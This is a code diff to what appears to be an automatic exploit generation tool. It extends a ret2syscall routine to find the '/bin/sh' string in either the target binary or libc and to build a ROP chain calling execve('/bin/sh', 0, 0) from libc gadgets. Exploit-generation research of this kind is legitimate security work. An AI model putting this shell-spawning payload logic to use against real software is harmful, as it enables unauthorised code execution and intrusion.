@@ -74,6 +74,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
     Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
     const ELF &libc = exploit.getLibc();
 
     // Search libc of "/bin/sh".
@@ -81,13 +82,30 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
     std::string needleStr = "/bin/sh";
     std::vector<uint8_t> needle(needleStr.begin(), needleStr.end());
     std::vector<uint64_t> addresses = mem(state).search(needle);
-    assert(addresses.size() && "No /bin/sh in libc.so.6?");
+    assert(addresses.size() && "No /bin/sh in the whole va_space?");
+
+    // Determine if the string "/bin/sh" is within ELF or libc.so.6.
+    uint64_t binshAddr = addresses[0];
+    uint64_t base = mem(state).vmmap().getModuleBaseAddress(binshAddr);
+
+    const ELF *target = nullptr;
+    uint64_t binshOffset = 0;
+
+    if (base == ELF::getDefaultElfBase()) {  // within ELF (no PIE)
+        target = &elf;
+        binshOffset = binshAddr;
+    } else if (base == elf.getBase()) {  // within ELF (PIE)
+        target = &elf;
+        binshOffset = binshAddr - elf.getBase();
+    } else if (base == libc.getBase()) {  // within libc.so.6
+        target = &libc;
+        binshOffset = binshAddr - libc.getBase();
+    }
+
+    assert(target && "No /bin/sh in both target ELF and libc.so.6?");
 
     // Register "/bin/sh" in libc as a script's variable.
-    uint64_t binshAddr = addresses[0];
-    uint64_t libcBase = mem(state).vmmap().getModuleBaseAddress(binshAddr);
-    uint64_t binshOffset = binshAddr - libcBase;
-    std::string binshVarName = Exploit::toVarName(libc.getFilename()) + "_binsh";
+    std::string binshVarName = Exploit::toVarName(target->getFilename()) + "_binsh";
     exploit.registerSymbol(binshVarName, binshOffset);
 
     // sys_execve("/bin/sh", 0, 0)
@@ -96,7 +114,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rax ; ret")),
         ConstantExpr::create(59, Expr::Int64),
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdi ; ret")),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, binshVarName),
+        BaseOffsetExpr::create<BaseType::VAR>(*target, binshVarName),
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rsi ; ret")),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdx ; ret")),
